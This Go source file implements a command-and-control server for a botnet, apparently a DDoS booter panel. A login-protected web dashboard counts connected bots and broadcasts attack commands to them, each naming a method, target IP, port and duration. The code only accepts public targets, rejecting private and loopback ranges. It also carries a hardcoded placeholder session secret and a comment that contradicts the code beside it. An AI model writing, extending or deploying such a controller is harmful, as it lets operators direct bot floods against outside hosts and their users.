package main

import (
	"bufio"
	"crypto/rand"
	"crypto/subtle"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"html/template"
	"log"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/alexedwards/argon2id"
	"github.com/gorilla/securecookie"
	"github.com/gorilla/sessions"
	"github.com/ulule/limiter/v3"
	"github.com/ulule/limiter/v3/drivers/middleware/stdlib"
	"github.com/ulule/limiter/v3/drivers/store/memory"
)

var (
	botConnections = make(map[int]net.Conn)
	botIDCounter   int
	botMutex       sync.Mutex

	// User storage
	users      = make(map[string]User)
	usersMutex sync.RWMutex

	// Session store
	sessionStore *sessions.CookieStore

	// Rate limiter
	loginRateLimiter *stdlib.Middleware

	// Configuration
	config = struct {
		SessionName        string
		UsersFile          string
		SessionSecretKey   string
		SessionMaxAge      int
		CSRFTokenLength    int
		LoginAttemptsLimit string
		PasswordMinLength  int
		PasswordMaxLength  int
	}{
		SessionName:        "secure_shield_session",
		UsersFile:          "users.json",
		SessionSecretKey:   "must-be-changed-in-production-32-byte-secret-key",
		SessionMaxAge:      86400 * 7, // 7 days
		CSRFTokenLength:    32,
		LoginAttemptsLimit: "10-M", // 10 requests per minute
		PasswordMinLength:  8,
		PasswordMaxLength:  128,
	}
)

type User struct {
	Username            string `json:"username"`
	PasswordHash        string `json:"password_hash"`
	CreatedAt           string `json:"created_at"`
	LastLogin           string `json:"last_login,omitempty"`
	FailedLoginAttempts int    `json:"failed_login_attempts,omitempty"`
	LastFailedAttempt   string `json:"last_failed_attempt,omitempty"`
}

func main() {
	// Initialize rate limiter for login attempts
	rate, err := limiter.NewRateFromFormatted(config.LoginAttemptsLimit)
	if err != nil {
		log.Fatal("Error creating rate limiter:", err)
	}
	limiterStore := memory.NewStore()
	loginRateLimiter = stdlib.NewMiddleware(limiter.New(limiterStore, rate))

	// Initialize session store with secure defaults
	sessionStore = sessions.NewCookieStore(
		[]byte(config.SessionSecretKey),
		[]byte(securecookie.GenerateRandomKey(32)), // Encryption key
	)
	sessionStore.Options = &sessions.Options{
		Path:     "/",
		MaxAge:   config.SessionMaxAge,
		HttpOnly: true,
		Secure:   true, // Changed from true to false
		SameSite: http.SameSiteLaxMode,
	}

	// Load or create users file
	if _, err := os.Stat(config.UsersFile); os.IsNotExist(err) {
		log.Println("Creating new users file")
		if err := saveUsers(); err != nil {
			log.Fatal("Error creating users file:", err)
		}
	} else {
		if err := loadUsers(); err != nil {
			log.Fatal("Error loading users:", err)
		}
	}

	serverAddress := "127.0.0.1:8080"

	// Start bot listener in background
	go startBotListener()

	// Setup routes
	router := http.NewServeMux()
	router.Handle("/", http.HandlerFunc(indexHandler))
	router.Handle("/login", loginRateLimiter.Handler(http.HandlerFunc(loginHandler)))
	router.Handle("/register", http.HandlerFunc(registerHandler))
	router.Handle("/profile", authMiddleware(http.HandlerFunc(profileHandler)))
	router.Handle("/dashboard", authMiddleware(http.HandlerFunc(dashboardHandler)))
	router.Handle("/logout", authMiddleware(http.HandlerFunc(logoutHandler)))
	router.Handle("/send-command", authMiddleware(http.HandlerFunc(sendCommandHandler)))

	// Add security middleware
	secureRouter := addSecurityHeaders(router)

	// Configure server with timeouts
	server := &http.Server{
		Addr:         serverAddress,
		Handler:      secureRouter,
		ReadTimeout:  10 * time.Second,
		WriteTimeout: 30 * time.Second,
		IdleTimeout:  60 * time.Second,
	}

	if err := server.ListenAndServeTLS("cert.pem", "key.pem"); err != nil {
		log.Fatal("Server error:", err)
	}
}

// Middleware to add security headers
func addSecurityHeaders(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Set security headers
		w.Header().Set("X-Frame-Options", "DENY")
		w.Header().Set("X-Content-Type-Options", "nosniff")
		w.Header().Set("X-XSS-Protection", "1; mode=block")
		w.Header().Set("Referrer-Policy", "strict-origin-when-cross-origin")

		// Only set HSTS if using HTTPS
		if r.TLS != nil {
			w.Header().Set("Strict-Transport-Security", "max-age=63072000; includeSubDomains; preload")
		}

		next.ServeHTTP(w, r)
	})
}

// Middleware to check authentication
func authMiddleware(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		session, err := sessionStore.Get(r, config.SessionName)
		if err != nil {
			clearSession(w, r)
			http.Redirect(w, r, "/login", http.StatusSeeOther)
			return
		}

		// Check if user is authenticated
		if auth, ok := session.Values["authenticated"].(bool); !ok || !auth {
			clearSession(w, r)
			http.Redirect(w, r, "/login", http.StatusSeeOther)
			return
		}

		username, ok := session.Values["username"].(string)
		if !ok || username == "" {
			clearSession(w, r)
			http.Redirect(w, r, "/login", http.StatusSeeOther)
			return
		}

		// Verify user exists
		usersMutex.RLock()
		_, exists := users[username]
		usersMutex.RUnlock()
		if !exists {
			clearSession(w, r)
			http.Redirect(w, r, "/login", http.StatusSeeOther)
			return
		}

		// Verify CSRF token for POST requests
		if r.Method == http.MethodPost {
			csrfToken, ok := session.Values["csrf_token"].(string)
			if !ok || csrfToken == "" || !verifyCSRFToken(r, csrfToken) {
				http.Error(w, "Invalid CSRF token", http.StatusForbidden)
				return
			}
		}

		// Call the next handler
		next.ServeHTTP(w, r)
	}
}

func verifyCSRFToken(r *http.Request, sessionToken string) bool {
	var requestToken string
	if r.Header.Get("X-CSRF-Token") != "" {
		requestToken = r.Header.Get("X-CSRF-Token")
	} else {
		requestToken = r.FormValue("csrf_token")
	}

	return subtle.ConstantTimeCompare([]byte(requestToken), []byte(sessionToken)) == 1
}

func indexHandler(w http.ResponseWriter, r *http.Request) {
	renderTemplate(w, "index.html", nil)
}

func loginHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodGet {
		session, _ := sessionStore.Get(r, config.SessionName)
		data := map[string]interface{}{
			"CSRFToken": session.Values["csrf_token"],
		}
		renderTemplate(w, "login.html", data)
		return
	}

	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	username := strings.TrimSpace(r.FormValue("username"))
	password := r.FormValue("password")

	if username == "" || password == "" {
		renderTemplate(w, "login.html", map[string]interface{}{
			"Error":     "Username and password are required",
			"CSRFToken": r.FormValue("csrf_token"),
		})
		return
	}

	// Get user from storage
	usersMutex.RLock()
	user, exists := users[username]
	usersMutex.RUnlock()

	// Check if account is locked
	if exists && user.FailedLoginAttempts >= 5 {
		lastAttempt, _ := time.Parse(time.RFC3339, user.LastFailedAttempt)
		if time.Since(lastAttempt) < 30*time.Minute {
			renderTemplate(w, "login.html", map[string]interface{}{
				"Error":     "Account temporarily locked due to too many failed attempts",
				"CSRFToken": r.FormValue("csrf_token"),
			})
			return
		} else {
			// Reset failed attempts if lockout period has passed
			usersMutex.Lock()
			user.FailedLoginAttempts = 0
			users[username] = user
			usersMutex.Unlock()
		}
	}

	if !exists {
		// Simulate password verification to prevent timing attacks
		argon2id.ComparePasswordAndHash(password, "$argon2id$v=19$m=65536,t=3,p=2$invalid$salt$hash")
		renderTemplate(w, "login.html", map[string]interface{}{
			"Error":     "Invalid username or password",
			"CSRFToken": r.FormValue("csrf_token"),
		})
		return
	}

	// Verify password
	match, err := argon2id.ComparePasswordAndHash(password, user.PasswordHash)
	if err != nil || !match {
		// Update failed login attempts
		usersMutex.Lock()
		user.FailedLoginAttempts++
		user.LastFailedAttempt = time.Now().Format(time.RFC3339)
		users[username] = user
		usersMutex.Unlock()
		saveUsers()

		renderTemplate(w, "login.html", map[string]interface{}{
			"Error":     "Invalid username or password",
			"CSRFToken": r.FormValue("csrf_token"),
		})
		return
	}

	// Successful login - reset failed attempts
	usersMutex.Lock()
	user.FailedLoginAttempts = 0
	user.LastLogin = time.Now().Format(time.RFC3339)
	users[username] = user
	usersMutex.Unlock()
	saveUsers()

	// Create new session with fresh CSRF token
	session, err := sessionStore.New(r, config.SessionName)
	if err != nil {
		http.Error(w, "Failed to create session", http.StatusInternalServerError)
		return
	}

	session.Values["username"] = username
	session.Values["authenticated"] = true
	session.Values["csrf_token"] = generateCSRFToken()
	session.Values["created_at"] = time.Now().Unix()

	if err := session.Save(r, w); err != nil {
		http.Error(w, "Failed to save session", http.StatusInternalServerError)
		return
	}

	http.Redirect(w, r, "/dashboard", http.StatusSeeOther)
}

func registerHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodGet {
		session, _ := sessionStore.Get(r, config.SessionName)
		data := map[string]interface{}{
			"CSRFToken": session.Values["csrf_token"],
		}
		renderTemplate(w, "register.html", data)
		return
	}

	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	username := strings.TrimSpace(r.FormValue("username"))
	password := r.FormValue("password")

	if username == "" || password == "" {
		renderTemplate(w, "register.html", map[string]interface{}{
			"Error":     "Username and password are required",
			"CSRFToken": r.FormValue("csrf_token"),
		})
		return
	}

	if len(password) < config.PasswordMinLength || len(password) > config.PasswordMaxLength {
		renderTemplate(w, "register.html", map[string]interface{}{
			"Error":     fmt.Sprintf("Password must be between %d and %d characters long", config.PasswordMinLength, config.PasswordMaxLength),
			"CSRFToken": r.FormValue("csrf_token"),
		})
		return
	}

	usersMutex.RLock()
	_, exists := users[username]
	usersMutex.RUnlock()

	if exists {
		renderTemplate(w, "register.html", map[string]interface{}{
			"Error":     "Username already exists",
			"CSRFToken": r.FormValue("csrf_token"),
		})
		return
	}

	// Hash password with Argon2id
	hash, err := argon2id.CreateHash(password, argon2id.DefaultParams)
	if err != nil {
		http.Error(w, "Failed to create user", http.StatusInternalServerError)
		log.Printf("Error hashing password: %v\n", err)
		return
	}

	// Create user
	user := User{
		Username:     username,
		PasswordHash: hash,
		CreatedAt:    time.Now().Format(time.RFC3339),
	}

	usersMutex.Lock()
	users[username] = user
	usersMutex.Unlock()

	if err := saveUsers(); err != nil {
		http.Error(w, "Failed to create user", http.StatusInternalServerError)
		log.Printf("Error saving user: %v\n", err)
		return
	}

	// Create session for the new user
	session, err := sessionStore.New(r, config.SessionName)
	if err != nil {
		http.Error(w, "Failed to create session", http.StatusInternalServerError)
		return
	}

	session.Values["username"] = username
	session.Values["authenticated"] = true
	session.Values["csrf_token"] = generateCSRFToken()

	if err := session.Save(r, w); err != nil {
		http.Error(w, "Failed to save session", http.StatusInternalServerError)
		return
	}

	http.Redirect(w, r, "/dashboard", http.StatusSeeOther)
}

func profileHandler(w http.ResponseWriter, r *http.Request) {
	session, _ := sessionStore.Get(r, config.SessionName)
	username := session.Values["username"].(string)

	usersMutex.RLock()
	user := users[username]
	usersMutex.RUnlock()

	data := struct {
		Username  string
		CreatedAt string
		LastLogin string
		CSRFToken string
	}{
		Username:  user.Username,
		CreatedAt: user.CreatedAt,
		LastLogin: user.LastLogin,
		CSRFToken: session.Values["csrf_token"].(string),
	}

	renderTemplate(w, "profile.html", data)
}

func dashboardHandler(w http.ResponseWriter, r *http.Request) {
	session, _ := sessionStore.Get(r, config.SessionName)
	username := session.Values["username"].(string)

	// Count connected bots
	botMutex.Lock()
	botCount := len(botConnections)
	botMutex.Unlock()

	data := struct {
		Username  string
		BotCount  int
		CSRFToken string
	}{
		Username:  username,
		BotCount:  botCount,
		CSRFToken: session.Values["csrf_token"].(string),
	}

	renderTemplate(w, "dashboard.html", data)
}

func sendCommandHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	// Verify CSRF token
	session, err := sessionStore.Get(r, config.SessionName)
	if err != nil {
		http.Error(w, "Invalid session", http.StatusUnauthorized)
		return
	}

	csrfToken, ok := session.Values["csrf_token"].(string)
	if !ok || csrfToken == "" || !verifyCSRFToken(r, csrfToken) {
		http.Error(w, "Invalid CSRF token", http.StatusForbidden)
		return
	}

	method := r.FormValue("method")
	ip := r.FormValue("ip")
	port := r.FormValue("port")
	durationStr := r.FormValue("duration")

	// Validate IP address
	if !isValidIPv4(ip) || isPrivateOrOwnIP(ip) {
		http.Error(w, "Invalid target IP address", http.StatusBadRequest)
		return
	}

	// Validate port
	portNum, err := strconv.Atoi(port)
	if err != nil || portNum < 1 || portNum > 65535 {
		http.Error(w, "Invalid port number", http.StatusBadRequest)
		return
	}

	// Validate duration
	duration, err := strconv.Atoi(durationStr)
	if err != nil || duration < 1 || duration > 240 {
		http.Error(w, "Invalid duration", http.StatusBadRequest)
		return
	}

	command := fmt.Sprintf("%s %s %d %s", method, ip, duration, port)
	sendToBots(command)
	http.Redirect(w, r, "/dashboard", http.StatusSeeOther)
}

func logoutHandler(w http.ResponseWriter, r *http.Request) {
	clearSession(w, r)
	http.Redirect(w, r, "/login", http.StatusSeeOther)
}

func clearSession(w http.ResponseWriter, r *http.Request) {
	session, _ := sessionStore.Get(r, config.SessionName)
	session.Options.MaxAge = -1 // Delete session
	session.Save(r, w)
}

func renderTemplate(w http.ResponseWriter, tmpl string, data interface{}) {
	t, err := template.ParseFiles("templates/" + tmpl)
	if err != nil {
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		log.Printf("Error parsing template %s: %v\n", tmpl, err)
		return
	}

	err = t.Execute(w, data)
	if err != nil {
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		log.Printf("Error executing template %s: %v\n", tmpl, err)
	}
}

func loadUsers() error {
	file, err := os.ReadFile(config.UsersFile)
	if err != nil {
		if os.IsNotExist(err) {
			return nil
		}
		return err
	}

	usersMutex.Lock()
	defer usersMutex.Unlock()
	if err := json.Unmarshal(file, &users); err != nil {
		return err
	}

	log.Printf("Loaded %d users from %s\n", len(users), config.UsersFile)
	return nil
}

func saveUsers() error {
	usersMutex.RLock()
	defer usersMutex.RUnlock()

	data, err := json.MarshalIndent(users, "", "  ")
	if err != nil {
		return err
	}

	if err := os.WriteFile(config.UsersFile, data, 0600); err != nil {
		return err
	}

	log.Printf("Saved %d users to %s\n", len(users), config.UsersFile)
	return nil
}

func generateCSRFToken() string {
	b := make([]byte, config.CSRFTokenLength)
	_, err := rand.Read(b)
	if err != nil {
		return ""
	}
	return base64.StdEncoding.EncodeToString(b)
}

func isValidIPv4(ip string) bool {
	parts := strings.Split(ip, ".")
	if len(parts) != 4 {
		return false
	}

	for _, part := range parts {
		num, err := strconv.Atoi(part)
		if err != nil || num < 0 || num > 255 {
			return false
		}
	}

	return true
}

func isPrivateOrOwnIP(ip string) bool {
	privateRanges := []string{
		"10.",                // 10.0.0.0/8
		"172.16.", "172.17.", // 172.16.0.0/12
		"172.18.", "172.19.",
		"172.20.", "172.21.",
		"172.22.", "172.23.",
		"172.24.", "172.25.",
		"172.26.", "172.27.",
		"172.28.", "172.29.",
		"172.30.", "172.31.",
		"192.168.", // 192.168.0.0/16
		"100.64.",  // Carrier-grade NAT (CGNAT) range
		"169.254.", // Link-local range
		"127.",     // Loopback range
	}

	for _, prefix := range privateRanges {
		if strings.HasPrefix(ip, prefix) {
			return true
		}
	}

	return false
}

// Bot-related functions
func startBotListener() {
	listener, err := net.Listen("tcp", ":9080")
	if err != nil {
		log.Fatal("Error starting bot listener:", err)
	}
	defer listener.Close()

	log.Println("Bot listener started on :9080")

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Println("Error accepting bot connection:", err)
			continue
		}

		botID := generateBotID()
		botMutex.Lock()
		botConnections[botID] = conn
		botMutex.Unlock()

		log.Printf("Bot %d connected from %s\n", botID, conn.RemoteAddr())
		go handleBotCommands(botID, conn)
	}
}

func generateBotID() int {
	botMutex.Lock()
	defer botMutex.Unlock()
	botIDCounter++
	return botIDCounter
}

func handleBotCommands(botID int, conn net.Conn) {
	defer conn.Close()

	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		command := strings.TrimSpace(scanner.Text())
		log.Printf("Received command from Bot %d: %s\n", botID, command)
		response := "Received command: " + command
		conn.Write([]byte(response + "\n"))
	}

	if err := scanner.Err(); err != nil {
		log.Println("Error reading from bot connection:", err)
	}

	botMutex.Lock()
	delete(botConnections, botID)
	botMutex.Unlock()

	log.Printf("Bot %d disconnected\n", botID)
}

func sendToBots(command string) {
	botMutex.Lock()
	defer botMutex.Unlock()

	for botID, conn := range botConnections {
		_, err := conn.Write([]byte(command + "\n"))
		if err != nil {
			log.Printf("Error sending command to Bot %d: %v\n", botID, err)
		} else {
			log.Printf("Sent command to Bot %d: %s\n", botID, command)
		}
	}
}
